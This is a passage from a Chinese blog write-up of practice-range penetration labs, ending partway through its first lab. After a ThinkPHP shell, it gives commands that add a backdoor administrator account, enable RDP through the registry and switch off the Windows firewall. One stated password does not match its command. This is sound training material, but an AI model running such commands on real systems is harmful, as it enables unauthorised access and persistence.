<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前言 老皮整了个无限时间的会员，爽死了，赶紧美美渗透 lab1 flag1 知识点：thinkphp框架漏洞 这个靶场不太一样，需要用openVPN连接 点击VPN已">
<title>cyberstrikelab渗透复现</title>

<link rel='canonical' href='http://localhost:1313/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="cyberstrikelab渗透复现">
<meta property='og:description' content="前言 老皮整了个无限时间的会员，爽死了，赶紧美美渗透 lab1 flag1 知识点：thinkphp框架漏洞 这个靶场不太一样，需要用openVPN连接 点击VPN已">
<meta property='og:url' content='http://localhost:1313/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/'>
<meta property='og:site_name' content='liernian'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-11-30T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-11-30T00:00:00&#43;00:00'/>
<meta name="twitter:title" content="cyberstrikelab渗透复现">
<meta name="twitter:description" content="前言 老皮整了个无限时间的会员，爽死了，赶紧美美渗透 lab1 flag1 知识点：thinkphp框架漏洞 这个靶场不太一样，需要用openVPN连接 点击VPN已">
    <link rel="shortcut icon" href="/favicon.ico" />

  


    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu11319725144555339807.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">💯</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">liernian</a></h1>
            <h2 class="site-description">理想主义的中二少年</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/CaiJimmy/hugo-theme-stack'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>关于</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>归档</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>搜索</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E9%93%BE%E6%8E%A5/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>链接</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">
                    
                        <li id="i18n-switch">  
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 5h7" />
  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
  <path d="M12 20l4 -9l4 9" />
  <path d="M19.1 18h-6.2" />
</svg>



                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
                                
                                    <option value="http://localhost:1313/en/" >English</option>
                                
                                    <option value="http://localhost:1313/" selected>简体中文</option>
                                
                                    <option value="http://localhost:1313/ar/" >عربي</option>
                                
                            </select>
                        </li>
                    
                

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>暗色模式</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">目录</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#前言">前言</a></li>
    <li><a href="#lab1">lab1</a>
      <ol>
        <li><a href="#flag1">flag1</a>
          <ol>
            <li><a href="#知识点thinkphp框架漏洞">知识点：thinkphp框架漏洞</a></li>
          </ol>
        </li>
        <li><a href="#flag3">flag3</a>
          <ol>
            <li><a href="#知识点rdp远程登录stowaway建立代理连接永恒之蓝">知识点：RDP远程登录、stowaway建立代理连接、永恒之蓝</a></li>
            <li><a href="#heading"></a></li>
          </ol>
        </li>
        <li><a href="#flag2">flag2</a>
          <ol>
            <li><a href="#知识点pth">知识点：PTH</a></li>
          </ol>
        </li>
        <li><a href="#总结">总结</a></li>
      </ol>
    </li>
    <li><a href="#lab2">lab2</a>
      <ol>
        <li><a href="#flag1-1">flag1</a>
          <ol>
            <li><a href="#知识点cve-2020-35339">知识点：<code>CVE-2020-35339</code></a></li>
          </ol>
        </li>
        <li><a href="#flag2-1">flag2</a>
          <ol>
            <li><a href="#知识点tomcat任意文件写入cve-2017-12615">知识点：Tomcat任意文件写入（CVE-2017-12615）</a></li>
          </ol>
        </li>
        <li><a href="#flag3-1">flag3</a>
          <ol>
            <li><a href="#知识点永恒之蓝">知识点：永恒之蓝</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#lab3">lab3</a>
      <ol>
        <li><a href="#flag1-2">flag1</a>
          <ol>
            <li><a href="#知识点cms简单cve">知识点：CMS简单cve</a></li>
          </ol>
        </li>
        <li><a href="#flag2-2">flag2</a>
          <ol>
            <li><a href="#知识点爆破木马后门密码">知识点：爆破木马后门密码？</a></li>
          </ol>
        </li>
        <li><a href="#flag3-2">flag3</a>
          <ol>
            <li><a href="#知识点rdpzerologon置空密码抓哈希打pth">知识点：RDP、zerologon置空密码抓哈希打PTH</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#lab4">lab4</a>
      <ol>
        <li><a href="#flag1-3">flag1</a>
          <ol>
            <li><a href="#知识点cmssql报错注入目录穿越修改php文件">知识点：CMS，sql报错注入+目录穿越修改php文件</a></li>
          </ol>
        </li>
        <li><a href="#flag2flag3">flag2&amp;flag3</a>
          <ol>
            <li><a href="#知识点zerologon置空密码抓取哈希">知识点：zerologon置空密码抓取哈希</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#lab5">lab5</a>
      <ol>
        <li><a href="#flag1-4">flag1</a>
          <ol>
            <li><a href="#知识点beemcms">知识点：BEEMCMS</a></li>
          </ol>
        </li>
        <li><a href="#flag2-3">flag2</a>
          <ol>
            <li><a href="#知识点zerologonpth">知识点：<code>zerologon</code>+PTH</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#lab6">lab6</a>
      <ol>
        <li><a href="#flag1-5">flag1</a>
          <ol>
            <li><a href="#知识点joomla历史漏洞">知识点：joomla历史漏洞</a></li>
          </ol>
        </li>
        <li><a href="#flag2-4">flag2</a>
          <ol>
            <li><a href="#知识点welogic历史漏洞">知识点：welogic历史漏洞</a></li>
          </ol>
        </li>
        <li><a href="#flag3-3">flag3</a>
          <ol>
            <li><a href="#知识点永恒之蓝-1">知识点：永恒之蓝</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#lab7">lab7</a>
      <ol>
        <li><a href="#flag1-6">flag1</a>
          <ol>
            <li><a href="#知识点bagecms历史漏洞">知识点：<code>bagecms</code>历史漏洞</a></li>
          </ol>
        </li>
        <li><a href="#flag2-5">flag2</a>
          <ol>
            <li><a href="#知识点永恒之蓝-2">知识点：永恒之蓝</a></li>
          </ol>
        </li>
        <li><a href="#flag3-4">flag3</a>
          <ol>
            <li><a href="#知识点pth-1">知识点：PTH</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#lab8">lab8</a>
      <ol>
        <li><a href="#flag1-7">flag1</a>
          <ol>
            <li><a href="#知识点zzzcms历史漏洞">知识点：zzzCMS历史漏洞</a></li>
          </ol>
        </li>
        <li><a href="#flag2-6">flag2</a>
          <ol>
            <li><a href="#知识点甜土豆提权转义开rdp爆破rdp">知识点：（甜土豆提权，转义开RDP）爆破RDP</a></li>
          </ol>
        </li>
        <li><a href="#flag3-5">flag3</a>
          <ol>
            <li><a href="#知识点非约束性委派上线cspowershell-command上线svc-exe提权pth">知识点：非约束性委派（上线CS、<code>powershell command</code>上线）、svc-exe提权、PTH</a></li>
          </ol>
        </li>
        <li><a href="#总结-1">总结</a></li>
      </ol>
    </li>
    <li><a href="#lab9">lab9</a>
      <ol>
        <li><a href="#flag1-8">flag1</a>
          <ol>
            <li><a href="#知识点cmseasy历史漏洞">知识点：<code>CMSeasy</code>历史漏洞</a></li>
          </ol>
        </li>
        <li><a href="#flag2-7">flag2</a>
          <ol>
            <li><a href="#知识点smb弱口令">知识点：smb弱口令</a></li>
          </ol>
        </li>
        <li><a href="#flag3-6">flag3</a>
          <ol>
            <li><a href="#知识点ad-cs">知识点：AD-CS</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#lab14">lab14</a>
      <ol>
        <li><a href="#flag1-9">flag1</a>
          <ol>
            <li><a href="#知识点pluck-cms历史漏洞">知识点：Pluck CMS历史漏洞</a></li>
          </ol>
        </li>
        <li><a href="#flag2-8">flag2</a>
          <ol>
            <li><a href="#知识点seacms历史漏洞">知识点：seacms历史漏洞</a></li>
          </ol>
        </li>
        <li><a href="#flag3-7">flag3</a>
          <ol>
            <li><a href="#知识点dpapi凭据解密">知识点：DPAPI凭据解密</a></li>
            <li><a href="#heading-1"></a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#lab15">lab15</a>
      <ol>
        <li><a href="#flag1-10">flag1</a>
          <ol>
            <li><a href="#知识点webmin弱口令">知识点：webmin弱口令</a></li>
          </ol>
        </li>
        <li><a href="#flag2-9">flag2</a>
          <ol>
            <li><a href="#知识点">知识点：</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#thunder">Thunder</a>
      <ol>
        <li><a href="#flag1-11">flag1</a>
          <ol>
            <li><a href="#知识点thinkphp一把梭免杀php木马">知识点：thinkphp一把梭、免杀php木马</a></li>
          </ol>
        </li>
        <li><a href="#flag2-10">flag2</a>
          <ol>
            <li><a href="#知识点mdut弱口令连接掩日网络分离免杀上线cs">知识点：<code>MDUT</code>弱口令连接、掩日网络分离免杀上线CS</a></li>
          </ol>
        </li>
        <li><a href="#flag3-8">flag3</a>
          <ol>
            <li><a href="#知识点stowaway二级代理修改数据库获取账号密码zblogit历史漏洞sudo--l提权">知识点：stowaway二级代理、修改数据库获取账号密码、zblogit历史漏洞、sudo -l提权</a></li>
          </ol>
        </li>
        <li><a href="#flag4">flag4</a>
          <ol>
            <li><a href="#知识点stowaway三级代理zimbra历史漏洞">知识点：stowaway三级代理、zimbra历史漏洞</a></li>
          </ol>
        </li>
        <li><a href="#总结-2">总结</a></li>
      </ol>
    </li>
    <li><a href="#sweetcake">SweetCake</a>
      <ol>
        <li><a href="#flag1-12">flag1</a>
          <ol>
            <li><a href="#知识点struts2漏洞利用php免杀土豆提权">知识点：struts2漏洞利用、php免杀、土豆提权</a></li>
          </ol>
        </li>
        <li><a href="#flag3-9">flag3</a>
          <ol>
            <li><a href="#知识点积木报表cve-2023-4450">知识点：积木报表CVE-2023-4450</a></li>
          </ol>
        </li>
        <li><a href="#flag2-11">flag2</a>
          <ol>
            <li><a href="#知识点通达oa未授权文件上传数据库udf提权">知识点：通达OA未授权文件上传、数据库UDF提权</a></li>
          </ol>
        </li>
        <li><a href="#flag4-1">flag4</a>
          <ol>
            <li><a href="#知识点获取rdp密码登录rdp">知识点：获取RDP密码登录RDP</a></li>
          </ol>
        </li>
        <li><a href="#flag5">flag5</a>
          <ol>
            <li><a href="#知识点stowaway二级代理ms17010">知识点：stowaway二级代理、MS17010</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#gear">Gear</a>
      <ol>
        <li><a href="#flag1-13">flag1</a>
          <ol>
            <li><a href="#知识点cms-made-simple历史漏洞">知识点：CMS Made Simple历史漏洞</a></li>
          </ol>
        </li>
        <li><a href="#flag2-12">flag2</a>
          <ol>
            <li><a href="#知识点用友rce">知识点：用友RCE</a></li>
          </ol>
        </li>
        <li><a href="#flag3-10">flag3</a>
          <ol>
            <li><a href="#知识点teamviewr连接">知识点：<code>teamviewr</code>连接</a></li>
          </ol>
        </li>
        <li><a href="#flag4-2">flag4</a>
          <ol>
            <li><a href="#知识点zerologon">知识点：zerologon</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#diamond">Diamond</a>
      <ol>
        <li><a href="#flag1-14">flag1</a>
          <ol>
            <li><a href="#知识点-1">知识点：</a></li>
          </ol>
        </li>
        <li><a href="#flag2-13">flag2</a>
          <ol>
            <li><a href="#知识点-2">知识点：</a></li>
          </ol>
        </li>
        <li><a href="#flag3-11">flag3</a>
          <ol>
            <li><a href="#知识点-3">知识点：</a></li>
          </ol>
        </li>
        <li><a href="#flag4-3">flag4</a>
          <ol>
            <li><a href="#知识点-4">知识点：</a></li>
          </ol>
        </li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/wp/" >
                Wp
            </a>
        
            <a href="/categories/web/" >
                Web
            </a>
        
            <a href="/categories/%E6%B8%97%E9%80%8F/" >
                渗透
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/">cyberstrikelab渗透复现</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-11-30</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    阅读时长: 29 分钟
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="前言">前言
</h2><p>老皮整了个无限时间的会员，爽死了，赶紧美美渗透</p>
<h2 id="lab1">lab1
</h2><h3 id="flag1">flag1
</h3><h4 id="知识点thinkphp框架漏洞">知识点：thinkphp框架漏洞
</h4><p>这个靶场不太一样，需要用openVPN连接</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130105614276.png"
	width="1511"
	height="952"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130105614276_hu15704074241537352045.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130105614276_hu7834171353679390626.png 1024w"
	loading="lazy"
	
		alt="image-20251130105614276"
	
	
		class="gallery-image" 
		data-flex-grow="158"
		data-flex-basis="380px"
	
></p>
<p>点击VPN已连接跳转网站</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130105713460.png"
	width="759"
	height="270"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130105713460_hu3304644549330138787.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130105713460_hu1733661042691187987.png 1024w"
	loading="lazy"
	
		alt="image-20251130105713460"
	
	
		class="gallery-image" 
		data-flex-grow="281"
		data-flex-basis="674px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130105802522.png"
	width="1154"
	height="599"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130105802522_hu8630909353329488201.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130105802522_hu16032885587349423111.png 1024w"
	loading="lazy"
	
		alt="image-20251130105802522"
	
	
		class="gallery-image" 
		data-flex-grow="192"
		data-flex-basis="462px"
	
></p>
<p>老规矩，先用fscan扫一遍，经典<code>thinkphp</code>漏洞</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130110013474.png"
	width="1174"
	height="455"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130110013474_hu2026364221364974684.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130110013474_hu4299963604770029418.png 1024w"
	loading="lazy"
	
		alt="image-20251130110013474"
	
	
		class="gallery-image" 
		data-flex-grow="258"
		data-flex-basis="619px"
	
></p>
<p>用工具嗦一下</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130211637669.png"
	width="574"
	height="582"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130211637669_hu15635413343908193429.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130211637669_hu8387104059202919103.png 1024w"
	loading="lazy"
	
		alt="image-20251130211637669"
	
	
		class="gallery-image" 
		data-flex-grow="98"
		data-flex-basis="236px"
	
></p>
<p>成功拿到shell，获得flag1</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130211810975.png"
	width="306"
	height="124"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130211810975_hu14650408141476548749.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130211810975_hu13546754506252376171.png 1024w"
	loading="lazy"
	
		alt="image-20251130211810975"
	
	
		class="gallery-image" 
		data-flex-grow="246"
		data-flex-basis="592px"
	
></p>
<h3 id="flag3">flag3
</h3><h4 id="知识点rdp远程登录stowaway建立代理连接永恒之蓝">知识点：RDP远程登录、stowaway建立代理连接、永恒之蓝
</h4><p>接下来要开启远程访问桌面，这样可以直接操控对方的主机</p>
<p>首先是添加用户</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net user liernian qwer123! /add
</span></span></code></pre></td></tr></table>
</div>
</div><p>在Windows系统中<code>net user</code>命令主要用于创建，修改，删除用户账户，上面的命令整体为添加名为<code>liernian</code>的新用户,密码为<code>123@abc</code></p>
<p><em>密码必须有数字字母特殊字符</em></p>
<p>然后再将其赋予管理员权限（这里怎么看是不是管理员权限？）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> net localgroup Administrators liernian /add
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>net localgroup</code>命令用于管理本地用户组，整条命令为将我们新创建的用户添加到用户组<code>Administrators</code>组中，以此来达到用户具有管理员权限。</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130215724130.png"
	width="613"
	height="115"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130215724130_hu672089268311453759.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130215724130_hu319415386290987354.png 1024w"
	loading="lazy"
	
		alt="image-20251130215724130"
	
	
		class="gallery-image" 
		data-flex-grow="533"
		data-flex-basis="1279px"
	
></p>
<p>接下来修改注册表启用远程桌面连接</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
</span></span></code></pre></td></tr></table>
</div>
</div><p>解释一下命令：</p>
<ul>
<li><strong><code>REG ADD</code></strong> - 注册表添加/修改命令</li>
<li><strong><code>HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server</code></strong> - 注册表路径
<ul>
<li><code>HKLM</code> = HKEY_LOCAL_MACHINE（本地机器根键）</li>
<li>这是远程桌面服务的配置路径</li>
<li><em>注意：命令中的引号可能是为了处理路径中的空格</em></li>
</ul>
</li>
<li><strong><code>/v fDenyTSConnections</code></strong> - 指定要修改的<strong>值名称</strong>
<ul>
<li><code>fDenyTSConnections</code> 是控制远程桌面是否允许连接的开关</li>
</ul>
</li>
<li><strong><code>/t REG_DWORD</code></strong> - 值的数据类型为DWORD（32位整数）</li>
<li><strong><code>/d 00000000</code></strong> - 要设置的数据值
<ul>
<li><code>00000000</code> = 允许远程连接</li>
<li><code>00000001</code> = 拒绝远程连接</li>
</ul>
</li>
<li><strong><code>/f</code></strong> - 强制覆盖，不提示确认</li>
</ul>
<p>光开启远程桌面连接是不够的，还需要ban掉防火墙</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netsh advfirewall set allprofiles state off
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#这里的命令直接把防火墙全部ban掉了，实际实战的时候这样还是不太行的，可以考虑只开发特定端口
</span></span><span class="line"><span class="cl"># 开放RDP端口
</span></span><span class="line"><span class="cl">netsh advfirewall firewall add rule name=&#34;RDP&#34; dir=in action=allow protocol=TCP localport=3389
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># 开放SMB共享端口
